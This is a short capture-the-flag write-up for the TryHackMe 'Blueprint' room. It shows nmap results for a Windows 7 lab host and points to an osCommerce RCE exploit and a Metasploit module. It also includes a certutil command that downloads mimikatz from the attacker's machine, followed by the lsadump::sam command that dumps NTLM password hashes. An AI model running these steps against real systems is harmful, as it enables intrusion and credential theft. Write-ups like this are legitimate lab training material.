# BulePrint Tryhackme

https://tryhackme.com/room/blueprint

#### Nmap

	80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/7.5
	|_http-title: 404 - File or directory not found.
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
	|_http-title: Bad request!
	| ssl-cert: Subject: commonName=localhost
	| Issuer: commonName=localhost
	| Public Key type: rsa
	| Public Key bits: 1024
	| Signature Algorithm: sha1WithRSAEncryption
	| Not valid before: 2009-11-10T23:48:47
	| Not valid after:  2019-11-08T23:48:47
	| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
	|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
	|_ssl-date: TLS randomness does not represent time
	| tls-alpn: 
	|_  http/1.1
	445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
	3306/tcp  open  mysql        MariaDB (unauthorized)
	8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
	| http-methods: 
	|   Supported Methods: GET HEAD POST OPTIONS TRACE
	|_  Potentially risky methods: TRACE
	|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
	|_http-title: Index of /
	49152/tcp open  msrpc        Microsoft Windows RPC
	49153/tcp open  msrpc        Microsoft Windows RPC
	49154/tcp open  msrpc        Microsoft Windows RPC
	49158/tcp open  msrpc        Microsoft Windows RPC
	49159/tcp open  msrpc        Microsoft Windows RPC
	49160/tcp open  msrpc        Microsoft Windows RPC
	Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows


8080/HTTP is OsCommerce is vulnerable to RCE 

1.
ExploitDB - osCommerce 2.3.4.1 Remote Code Execution 
https://www.exploit-db.com/exploits/44374

^Modify the exploit and use 

2.
Use MsfModule
	
	exploit/multi/http/oscommerce_installer_unauth_code_exec

set options then run!

We got meterpreter then open shell!

use **mimikatz** to get NLTM Hash

	certutil.exe -urlcache -f http://10.9.172.114:8000/mimikatz.exe mimikatz.exe
	mimikatz.exe
	lsadump::sam

^After run you got Hash! Decrypt then submmit

### Root Flag
Navigate to C:\Users\Administrator\Desktop cat the root flag
















